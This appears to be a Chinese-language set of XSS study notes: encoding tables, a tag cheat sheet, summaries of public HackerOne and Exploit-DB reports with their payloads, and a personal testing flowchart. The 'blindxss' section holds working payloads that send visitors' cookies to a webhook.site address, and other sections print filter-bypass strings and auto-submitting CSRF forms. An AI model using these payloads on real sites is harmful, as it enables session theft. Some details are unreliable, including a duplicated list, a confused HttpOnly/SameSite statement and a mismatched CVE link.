1. 插元数据，保证，插入不被编码/转义（都是xml元数据在保存时自动编码的）
   1. 部分编码：jpg、avif、gif、heic、webp
   2. 无编码：png
   3. 全编码：xml/svg
2. 编码/转义的原因：保存时自动编码/转义，没办法！ -> **svg/xml不能使用元数据**

### 6. 什么情况的文件XSS不能拿cookie

文件xss原因：

1. 元数据（几乎所有)
2. 标签引入文件（svg、pdf，那些格式本身支持脚本的，并且也支持文件引入标签的）
3. 依靠mime错误 -> text/html（所有）

就只是这个第三个不能获取，因为直接访问的document不是目标的dom（前提：文件存储/访问路径，不是同站！）

### 7. 各种编码的默认特殊字符

| 类型         | 主要需要编码的字符                                           |
| :----------- | :----------------------------------------------------------- |
| URL 编码     | 空格, `"`, `#`, `%`, `&`, `'`, `(`, `)`, `*`, `+`, `,`, `/`, `:`, `;`, `<`, `=`, `>`, `?`, `@`, `[`, `\`, `]`, `^`, `{`, ` |
| HTML 实体    | `&`, `<`, `>`, `"`, `'`, `/`（可选）                         |
| Unicode 编码 | 理论上任意字符，但重点是 `<`, `>`, `"`, `'`, `&`, `/`, 空格  |

### 8、请求体中不同类型的payload

1. xml中，可以尝试html编码
2. application/x-www-form-urlencoded中，可以进行url编码
3. multipart/form-data可以不编码
4. json
   1. 可以进行unicode编码，但是特殊字符"、'、{、}不能，因为
      JSON 允许 " 以 \u0022 表示，但解析后等同于 \\"
   2. 不支持代引号的payload，如blindxss，所以json的pyload就是innerhtml，并且里面最多带单引号

### 9、\转义符起作用的环境

| 环境           | 是否支持`\`转义 | 主要转义规则                                     | 典型应用场景     |
| :------------- | :-------------- | :----------------------------------------------- | :--------------- |
| **JSON**       | ✔️               | `\"` `\\` `\/` `\b` `\f` `\n` `\r` `\t` `\uXXXX` | 数据交换格式     |
| **JavaScript** | ✔️               | `\'` `\"` `\\` `\`` `\n` `\t` `\uXXXX` `\xXX`    | 前端编程         |
| **HTML**       | ❌               | 使用HTML实体：`<` `>` `"` `&` `&#XXXX;`          | 网页渲染         |
| **URL**        | ❌               | 使用百分号编码：`%20` `%22` `%5C` `%3C` `%3E`    | 网址参数         |
| **正则表达式** | ✔️               | `\.` `\\` `\d` `\s` `\[` `\]`                    | 字符串匹配       |
| **SQL**        | ❌(部分支持)     | 数据库相关：MySQL`\'` PostgreSQL`''` SQLite`''`  | 数据库查询       |
| **文件路径**   | ✔️(Windows)      | Windows:`\\` Linux/macOS:`/`                     | 操作系统文件访问 |
| **XML**        | ❌               | 使用实体引用：`<` `>` `&` `"` `'`                | 数据存储与传输   |
| **CSV**        | ✔️               | 双引号转义：`""`表示单个`"`                      | 表格数据存储     |
| **Markdown**   | ✔️(部分)         | `\\`转义特殊字符：`\*` `\_` `\#`等               | 文档编写         |

### 10、blindxss

```
'"><img src=x onerror='this.src="https://webhook.site/031950ee-f5ab-442a-acd0-3307be044663?"+btoa(document.cookie)'>
<img src=x onerror='this.src="https://webhook.site/031950ee-f5ab-442a-acd0-3307be044663?"+btoa(document.cookie)'>
"><script>fetch('https://webhook.site/031950ee-f5ab-442a-acd0-3307be044663?c=' + btoa(document.cookie));</script>
javascript:window.location="https://webhook.site/031950ee-f5ab-442a-acd0-3307be044663?"+btoa(document.cookie)
{"b":"<img src=x onerror=fetch(`https://webhook.site/031950ee-f5ab-442a-acd0-3307be044663?=`+document.cookie)>"}
```

### 11、tag sheets

```
1. img（onerror、src触发）
2. svg（支持大量事件，支持<foreignObject>嵌套html）
3. iframe（onload、srcdoc执行）
4. embed（onload、src）
5. object（onerror、data）
6. video（onerror、onloadstart）
7. audio（onerror）
8. body（onload）
9. input（onfocus、onmouseover）
10. textarea（onfocus、oninput）
11. button（onclick）
12. div（可嵌入 script、绑定事件）
13. span（同上）
14. form（可用于 phishing、onsubmit）
15. a（href=javascript:）
16. frame（src）
17. frameset（onload）
18. image（img 别名）
19. image2（img2 别名）
20. image3
21. img2
22. input2 / input3 / input4
23. video2（video 别名）
24. iframe2（iframe 别名）
56. article
57. section
58. aside
59. header
60. footer
61. nav
62. main
63. h1（onclick 等）
64. p（同上）
65. ul / ol / li
66. dl / dt / dd
67. q / blockquote / cite
68. strong / em / b / i / u / s / strike
69. sub / sup
70. ruby / rb / rt / rp / rtc
71. abbr / acronym
72. kbd / samp / var / code
73. caption
74. figcaption / figure
75. hgroup
76. big / small
77. font / center
78. br / hr / wbr
56. article
57. section
58. aside
59. header
60. footer
61. nav
62. main
63. h1（onclick 等）
64. p（同上）
65. ul / ol / li
66. dl / dt / dd
67. q / blockquote / cite
68. strong / em / b / i / u / s / strike
69. sub / sup
70. ruby / rb / rt / rp / rtc
71. abbr / acronym
72. kbd / samp / var / code
73. caption
74. figcaption / figure
75. hgroup
76. big / small
77. font / center
78. br / hr / wbr
```

### 12、CSP内容加载控制策略

CSP只能控制加载，是浏览器接收服务端的CSP请求头之后做出的策略，因此不能防护DOMXSS

```
Content-Security-Policy: policy
```

# 二、案例


### 1. 无过滤RXSS

[U.S. Dept Of Defense | Report #2888784 - XSS vulnerability found in javascript code of https://███.mil | HackerOne](https://hackerone.com/reports/2888784)

一个反射型XSS，code参数直接输出到JS代码中，没有一点过滤：

```
https://███.mil/?code=xxx';%0d%0a!!!MALICIOUS%20CODE%20HERE!!!;%0d%0avar%20x='
```

```js
<script>
window.location.href = 'ProcessUserSSO?catalogId=10051&langId=-1&app='+clientId+'&ra2='+ra2+'&ssoAction=logon&code=xxx';
!!!MALICIOUS CODE HERE!!!;
var x='&uoa=';
</script>
```

[U.S. Dept Of Defense | Report #2853410 - XSS found in https://www.████████.mil | HackerOne](https://hackerone.com/reports/2853410)类似

### 2. SMTP 错误日志注入

[XVIDEOS | Report #2956266 - Stored XSS via SMTP Error Message | HackerOne](https://hackerone.com/reports/2956266)

一个存储型XSS，在账户邮箱登录/注册页面，支持第三方邮箱/其他自定义邮箱服务。

问题出在：如果邮箱输入错误，邮箱服务器会发送错误信息给XVIDEOS，并且他会存储在数据库中，然后直接html显示到页面中，不经过安全处理。

**攻击条件：**

1. 自己搭建一个邮箱服务，需要注册域名
2. 用户恰巧使用你这个邮箱服务，并且输出错误导致发送错误日志
3. 自定义邮箱服务的错误日志：里面存入payload

**提高几率：**

1. 如果可以借用CSRF，那么就可以不要考虑第二点，因为可以指定了

**类似案例：**

1. 和form表单处的数据库操作错误回显到页面一样，都是借用错误日志显示到页面的注入

### 3. Swagger UI XSS

[MTN Group | Report #2321874 - DOM Based Reflected Cross Site Scripting | HackerOne](https://hackerone.com/reports/2321874)

[Mars | Report #2684274 - RXSS on ████ via configUrl parameter | HackerOne](https://hackerone.com/reports/2684274)，也是swagger的xss

#### **复现：**

**步骤 1**：创建一个恶意 Swagger 定义文件（`evil.yaml`）：

```
openapi: 3.0.0
info:
  title: "<img src=x onerror=alert(document.domain)>"
  version: 1.0.0
```

**步骤 2**：在 Swagger UI 中加载该文件（旧版可能直接执行脚本）：

```
https://swagger.example.com/?url=https://attacker.com/evil.yaml
```

### 4. Jolokia 1.3.7 CVE

[CVE-2018-1000129 \] RXSS At `https://███████` via the URI | HackerOne](https://hackerone.com/reports/2778412)

这个人在美国国防部的某个网站发现存在 **CVE-2018-1000129** 是一个与跨站脚本（XSS）漏洞相关的安全问题，影响了 Jolokia 代理版本 1.3.7。Jolokia 是一个开源的 Java 库，在版本 1.3.7 中，其 HTTP Servlet（服务端组件）存在安全漏洞。

假设 Jolokia 的某个端点接受参数 q，而服务器未清理该参数：

```
GET /jolokia?q=<script>alert('XSS')</script>
```

### 5. 云平台发现RXSS -> CVE

[AWS VDP | Report #2787650 - Reflected XSS on Amazon EC2 Instance | HackerOne](https://hackerone.com/reports/2787650)

##### Amazon EC2控制台发现errorCode参数反射XSS -> CVE

```
https://console.aws.amazon.com/ec2/v2/home?errorCode=███████);alert(document.cookie)//
```

### 6. XSS与CSRF的关系

##### XSS到CSRF：

1. 传统的CSRF受到很多跨站限制
   1. Cookie的SameSite：Lax（跨站需要点击才能发送cookie）、Strict（完全禁止跨站发送cookie）
   2. Origen、Referer检测
   3. 传统的Token
2. 当使用XSS在同站构造提交CSRF，以上都能绕过，但是可能有新的阻碍
   1. 更高级的Token校验
   2. 敏感操作双重验证

```
samesite和httponly不是同一个东西，后者是阻止前端js读取cookie，后者是阻止前端跨站发送cookie；
前者影响xss，后者影响csrf，csrf获取cookie是利用发送出来的cookie！
```

##### CSRF到XSS：

1. 所谓的self-xss
2. 存储xss -> csrf -> xss实现蠕虫
3. payload不在geturl参数中，需要post请求发送（一般都是这个情况）

##### 同例：

[U.S. Dept Of Defense | Report #2736979 - CSRF to XSS | HackerOne](https://hackerone.com/reports/2736979)

[美国国防部 |报告 #1118501 - CSRF 到跨站点脚本 （XSS） |黑客一号](https://hackerone.com/reports/1118501)

### 7. redirect_url参数登录重定向XSS

**同例：**

[Acronis | Report #2653342 - Potential XSS in redirect_url Parameter | HackerOne](https://hackerone.com/reports/2653342)

[TikTok | Report #2583874 - DOM XSS in tiktok.com/login via the redirect_url parameter | HackerOne](https://hackerone.com/reports/2583874)

[Acronis | Report #2611305 - Potential XSS Vulnerability in Acronis Login Callback URL | HackerOne](https://hackerone.com/reports/2611305)

### 8. 编辑器XSS

[Basecamp | Report #2521419 - Stored XSS on trix editor version 2.1.1 | HackerOne](https://hackerone.com/reports/2521419)

在web中经常引入第三方富文本编辑器：Trik、Slack，这些可以直接执行html代码

### 9. XSS盲注

[Acronis | Report #666040 - Blind XSS on admin.acronis.com via delete account form on account.acronis.com | HackerOne](https://hackerone.com/reports/666040)

**通过 `account.acronis.com` 的删除账户表单在 `admin.acronis.com` 上触发盲注 XSS**

盲注:

	就是前端输入 -> (存储到数据库) -> 后端输出，我们看不见后端执行没有，但是可以使用数据外带比如DNSLOG查看。不管前后端分没分离都一样。

### 10. Ruby on Rails [CVE-2024-26143](https://hackerone.com/hacktivity/cve_discovery?id=CVE-2024-26143)

[Internet Bug Bounty | Report #2520694 - Possible XSS Vulnerability in Action Controller | HackerOne](https://hackerone.com/reports/2520694)

#### 漏洞描述：

```
CVE 编号：CVE-2024-26143
发布时间：2024年2月27日
影响组件：Ruby on Rails 的 Action Controller 中的翻译助手（translation helpers）
```

Rails 默认假设以 _html 结尾的翻译键是安全的 HTML，会直接渲染而不转义。如果 :default 中混入了用户输入，而开发者没有对其进行清理，攻击者就能注入恶意代码。

```ruby
# 控制器中
class SomeController < ApplicationController
  def index
    @message = translate("greeting_html", default: params[:user_input])
  end
end

# 视图中
<%= @message %>
```

### 11. Ruby on Rails [CVE-2020-15169](https://hackerone.com/hacktivity/cve_discovery?id=CVE-2024-26143)

[Ruby on Rails | Report #2303609 - XSS when using `translate` in Action Controller (Rails 7.0, 7.1) | HackerOne](https://hackerone.com/reports/2303609)

#### 漏洞描述：

```
CVE 编号：CVE-2020-15169
发布时间：2020年9月9日
影响组件：Ruby on Rails 的 Action View 中的翻译助手（translation helpers）
```

以下是一个可能受影响的代码示例：

```ruby
<%# 假设 welcome_html 翻译键未定义 %> <%= t("welcome_html", default: params[:user_input]) %>
```

- 如果 params[:user_input] 是用户可控的输入（比如 <script>alert('XSS')</script>），且未被过滤，翻译结果会包含恶意脚本。
- Rails 默认认为以 _html 结尾的键是安全的 HTML，会直接渲染而不转义，导致 XSS。

### 12. 提问处插入payload未过滤

[Drugs.com | Report #1901706 - Stored Xss On "https://www.question.com/" | HackerOne](https://hackerone.com/reports/1901706)

```
<iframe onload=alert(document.domail)>
```

### 13、文件上传存储XSS

[TikTok | Report #2306491 - Stored-XSS-ads.tiktok.com | HackerOne](https://hackerone.com/reports/2306491)

通过视频上传功能发现存储跨站脚本 （XSS） 漏洞。由于缺乏必要的检查，可以上传包含 HTML 和 JavaScript 代码的 MP4 视频文件和 XML 文件，从而导致它们在受害者的浏览器中执行。

### 14、后端**Sanitizer** html消毒器绕过 | 评论区插入

[MercadoLibre | Report #1675516 - Stored XSS in reclamos | HackerOne](https://hackerone.com/reports/1675516)

```
<p><p><p><p><p><p><p><p><audio/src/onerror=alert(document.domain)>
```

消毒器的解析过程出现异常：

1. **前 7 个 `<p>`**：被正常补全为 `<p></p>`。
2. **第 8 个 `<p>`**：未闭合，导致解析器状态混乱。
3. **后续 `<audio>` 标签**：被错误地允许插入，并保留了 `onerror` 事件。

```
<p></p>
<p></p>
...
<p>  <!-- 未正确闭合 -->
  <audio/src/onerror=alert(document.domain)>  <!-- 恶意代码保留 -->
</p>
```

常见 Sanitizer 实现:

| 工具/库                  | 语言/平台       | 特点                               |
| :----------------------- | :-------------- | :--------------------------------- |
| **DOMPurify**            | JavaScript      | 轻量级，高安全性，支持自定义规则   |
| **Rails SanitizeHelper** | Ruby on Rails   | 内置 `sanitize` 方法，可配置白名单 |
| **PHP HTML Purifier**    | PHP             | 功能强大，支持复杂的 HTML 标准     |
| **Google Caja**          | Java/JavaScript | 早期方案，现较少使用               |

### 15、Apache Airflow的XSS供应链攻击 -> CVE

[Internet Bug Bounty | Report #2677187 - CVE-2024-41937: Apache Airflow: Stored XSS Vulnerability on provider link | HackerOne](https://hackerone.com/reports/2677187)

**Apache Airflow**：

	是一个开源的 **工作流自动化调度平台**，用于以编程方式编写、调度和监控任务流程；在里面有一个**Apache Airflow 的 Provider 文档链接功能**。

#### 复现：

1. 攻击者创建一个恶意的 Airflow Provider（数据连接插件），并在其文档链接中嵌入 XSS 代码，例如：

   ```
   # 恶意 Provider 的 setup.py
   documentation_url = 'javascript:alert(document.domain)'
   ```

2. **管理员安装 Provider**
   运维人员将恶意 Provider 安装到 Airflow 服务器。

3. **用户触发 XSS**
   当用户在 Airflow Web UI 中点击该 Provider 的文档链接时，恶意脚本在用户浏览器中执行。

### 16、无过滤RXSS

[MTN Group | Report #1799197 - Reflected cross site scripting (XSS) attacks Reflected XSS attacks, | HackerOne](https://hackerone.com/reports/1799197)

payload:

```
 https://102.176.160.119:10443/remote/error?errmsg=--><script>alert（document.domain）</script>
```

### 17、无过滤的RXSS | POST参数 | CSRF->XSS

[U.S. Dept Of Defense | Report #2670521 - XSS found for https://█████████ | HackerOne](https://hackerone.com/reports/2670521)

POC:

```html
<html>
<body>
<script>
	window.onload = function(){document.forms['XSS'].submit();}
</script>
	<form id='XSS' action='https://█████████/web/guest/search' method='post'>
		<input type='text' name='query' value="'};alert('XSS');var x={y:'">
	</form>
</body>
</html>
```

### 18、标签大小写绕过的RXSS

[U.S. Dept Of Defense | Report #2615670 - XSS on ███████ | HackerOne](https://hackerone.com/reports/2615670)

payload:

```
https://█████████/thredds/dap4/"1<ScRiPt>alert(9218)</ScRiPt>
```

```
<不敏感 不敏感="协议不敏感:敏感()"></不敏感>
```

### 19、MetaMask 浏览器的CSP忽略漏洞

[MetaMask | Report #1941767 - MetaMask Browser (on Android) does not enforce Content-Security-Policy header | HackerOne](https://hackerone.com/reports/1941767)

#### **漏洞概述**

- **漏洞类型**：内容安全策略（CSP）绕过
- **影响组件**：MetaMask 移动端浏览器（iOS/Android）
- **根本原因**：浏览器在处理网页请求时，错误地忽略了网站设置的 `Content-Security-Policy` 头
- **风险等级**：中高危（可能引发 XSS、数据泄露等连锁攻击）

### 20、特殊闭合技巧的RXSS

[Acronis | Report #1145712 - Reflected XSS on www.acronis.com/de-de/my/subscriptions/index.html | HackerOne](https://hackerone.com/reports/1145712)

payload:

```
'“1<!--></title/</textarea/</script/><Details/Open/OnToggle=confirm()>
```

```
闭合技巧：
1. <!-->闭合注释，因为-->可能直接会被接过滤，但是<!--不会，而<!-->就照成了混淆，也能达到-->的效果
2. 多标签连续闭合 </title/</textarea/</script/>，这些都是对父标签的闭合，并且都有效果
```

```
<Details/Open/OnToggle=confirm()> == <Details Open OnToggle=confirm()>
```

### 21、Swagger UI的HTML注入

复现：

1. Nevigate 到`https://35.156.81.191/swagger?`
2. 添加此效负载`config=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json`
3. 放置有效负载后，您将看到已成功创建的假登录页面。

### 22、POST参数中的RXSS | CSRF -> XSS

[Acronis | Report #961787 - CSRF and XSS on www.acronis.com | HackerOne](https://hackerone.com/reports/961787)

payload：

```
1“<!--><Svg OnLoad=（confirm）（document.cookie）<!--
```

### 23、注入点为document.referrer的RXSS

[Acronis | Report #961787 - CSRF and XSS on www.acronis.com | HackerOne](https://hackerone.com/reports/961787)

#### 一、**问题代码定位：**

在目标页面的 JavaScript 中，存在以下危险代码：

```
try {
  // 其他 document.write 语句...
  document.write('<script src="' + document.referrer + '/marketo/common.js"></script>');
} catch(e) {}
```

直接使用 `document.referrer` 动态生成脚本标签，且未对来源进行校验。

#### 二、攻击思路：

1. **搭建恶意网站**：
   攻击者创建一个页面，内嵌目标页面的 iframe：

   ```
   <iframe src="https://promo.acronis.com/GL-Trial-MassTransit.html"></iframe>
   ```

2. **伪造 `referrer` 路径**：
   恶意网站的同目录下放置伪造的 `marketo/common.js`：

   ```
   // 恶意代码示例
   alert('XSS');
   window.location.href = "https://phishing-site.com";
   ```

3. **诱导用户访问恶意页面**：
   用户访问后，目标页面会加载攻击者的脚本并执行。

#### 三、与http referer的区别

| **特性**         | **`document.referrer` (JavaScript)**          | **HTTP `Referer` 头**                |
| :--------------- | :-------------------------------------------- | :----------------------------------- |
| **来源**         | 由浏览器自动生成，表示当前页面的来源 URL      | 由浏览器在 HTTP 请求中发送的头部字段 |
| **可控性**       | 仅当用户通过点击链接或表单提交跳转时设置      | 可通过工具（如 Burp Suite）直接修改  |
| **修改权限**     | **前端不可写**（只读属性）                    | 可被代理工具篡改                     |
| **漏洞利用条件** | 需控制用户访问的上一页面（如恶意网站 iframe） | 修改请求头不影响 `document.referrer` |

### 24、X2CRM的一个存储XSS -> CVE

[X2CRM 8.5 - 存储跨站脚本 （XSS） - PHP Web 应用程序漏洞](https://www.exploit-db.com/exploits/52098)

- **漏洞名称**：X2CRM v8.5 存储型跨站脚本攻击（XSS）
- **CVE编号**：CVE-2024-48120
- **影响版本**：X2CRM v8.5
- **漏洞类型**：存储型 XSS（需认证）
- **漏洞位置**：`/opportunities/createList` 接口的 `X2List[name]` 参数

payload：未作任何过滤

```
<script>alert(2);</script>
```

### 25、FluxBB 1.5.11 – 后台存储XSS

[FluxBB 1.5.11 - Stored Cross-Site Scripting (XSS) - PHP webapps Exploit](https://www.exploit-db.com/exploits/52090)

鸡肋：

	只能管理员触发，如果攻击者没有权限，需要借用CSRF -> XSS！

**步骤 1**：

- 登录到管理员面板（需要管理员账户权限）。

**步骤 2**：

- 导航到 /admin_forums.php 页面（管理员论坛管理页面）。

**步骤 3**：

- 点击“Add Forum”（**添加论坛**）。

**步骤 4**：

- 输入payload

  ```
  <iframe src=javascript:alert(1)>
  ```

### 26、TranzAxis - 后台存储型XSS

[TranzAxis 3.2.41.10.26 - Stored Cross-Site Scripting (XSS) (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/52086)

- **漏洞名称**：TranzAxis 终端监控功能存储型XSS
- **影响版本**：3.2.41.10.26
- **漏洞类型**：存储型跨站脚本攻击（需认证）
- **漏洞位置**：`Explorer Tree` 的**保存标题**功能
- **披露时间**：2025年3月10日
- **发现团队**：ABABANK REDTEAM
- **Payload**：`<img src=x onerror=alert(document.domain)>`

- **需认证**：至少需要普通用户权限

### 27、Gitea 1.22.0 - 存储XSS

[Gitea 1.22.0 - Stored XSS - Multiple webapps Exploit](https://www.exploit-db.com/exploits/52077)

#### 重现步骤：

1. 登录到 Gitea 应用。

2. 创建一个新仓库，或者修改现有仓库。点击 `$username/$repo_name/settings` 端点中的 **Settings** 按钮。

3. 在 **Description（描述）** 字段中输入以下 payload（有效载荷）：

   ```
   <a href=javascript:alert()>XSS test</a>
   ```

4. 保存更改。

5. 当点击该仓库的描述时，payload 成功被注入并执行。点击该描述后，将弹出一个 **alert** 框，表示恶意脚本成功执行。

### 28、**HelpDeskZ v2.0.2 存储型XSS**

[Helpdeskz v2.0.2 - Stored XSS - PHP webapps Exploit](https://www.exploit-db.com/exploits/52068)

- **披露时间**：2024年8月8日

1. **登录系统**
   使用普通用户账号登录HelpDeskZ。

2. **创建恶意工单**

   - 填写正常工单内容（标题、描述等）

   - 上传附件，文件名设置为：

     复制

     ```
     "><img src=x onerror=alert(document.cookie);>.png
     ```

3. **提交工单**
   系统将存储未过滤的文件名。

4. **管理员触发XSS**
   当管理员在后台查看该工单时：

   - 文件名被直接渲染为HTML
   - `onerror` 事件执行，泄露管理员Cookie

### 29、Calibre-web 0.6.21 存储XSS - CVE-2024-39123

[Calibre-web 0.6.21 - Stored XSS - Multiple webapps Exploit](https://www.exploit-db.com/exploits/52067)

**步骤 1**：

- 登录到 Calibre-web 应用程序。

**步骤 2**：

- 上传一本新书。

**步骤 3**：

- 从 /table?data=list&sort_param=stored 端点访问“Books List”（书籍列表）功能。

**步骤 4**：

- 在“Comments”（评论）字段中输入以下恶意载荷：

```
payload未作任何过滤！
```

### 30、Microweber 2.0.15 - 个人资料存储XSS

[Microweber 2.0.15 - Stored XSS - PHP webapps Exploit](https://www.exploit-db.com/exploits/52058)

1. **登录** Microweber 应用。

2. **导航至** `Users > Edit Profile`（用户 > 编辑个人资料）。

3. 在 **“First Name”**（名字）输入框中，输入以下 **XSS Payload（恶意代码）**：

   ```
   "><img src=x onerror=confirm(document.cookie)>
   ```

  ### 31、POST | 创建工作区名称 -> 电子邮件处

[Slack | Report #1461194 - Email html Injection | HackerOne](https://hackerone.com/reports/1461194)

### 32、GET 参数 

[Slack | Report #146336 - XSS vulnerable parameter in a location hash | HackerOne](https://hackerone.com/reports/146336)

```
https://slack.com/is#?cvo_sid1=111\u0026;typ=55577]")%3balert(document.cookie)%3b//
```

### 33、POST

https://api.slack.com/feedback/submit 接口的，path参数

payload:

```html
<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="javascript:alert()"> 
<input type='hidden' name='vote' value="Yes">
</form>
<script>document.pisarenko.submit();</script>
```

### 34. 注入点在back button的herf

[Shopify | Report #1754843 - Reflected XSS In Marketing Reports Page On *.myshopify.com/admin | HackerOne](https://hackerone.com/reports/1754843)

### 35. 输出点在响应头

[Shopify | Report #2279572 - HTTP Response Header Injection in shopify/pitchfork + Rack 3 | HackerOne](https://hackerone.com/reports/2279572)

# 三、自我理解

```
\"\'\(\<wjch>\>\)\'\"
```

### **innerhtml中：**

1. 判断<、>有没有实体化
   1. 是跑路
   2. 否，跑我的innerhtml payload

### **属性中：**

1. 闭合属性
   1. 使用单、双引号，闭合
   2. 如果过滤、实体化编码等
      1. 我们也html编码
         1. 还绕不过，跑路
   3. 如果被转义
      1. 看看\本身有没有被转义，可以试试在前面加上\
         1. 转了，跑路
   4. 一切顺利，闭合了
   5. portswigger跑这个tag的事件，看看有没有被waf，找到一个可以，并且事件能够执行，
      1. 找不到一个，闭合标签
      2. 找到事件，过一遍几个方法：alert()、print()、prompt()、confirm()
         1. 都被waf了，html编码+js编码
            1. 都绕不过
               1. 如果没找到，再闭合标签
2. 闭合标签
   1. 判断<、>有没有实体化
      1. 是跑路
      2. 否，跑我的innerhtml payload

### **script中：**

1. 单、双引号闭合
   1. 被实体化或者其他编码
      1. 跑路
   2. 被转义
      1. 看看\本身是否被转义
         1. 是跑路
2. 闭合了，过一遍几个方法：alert()、print()、prompt()、confirm()
   1. 都被waf了，js编码
      1. 都绕不过，跑路

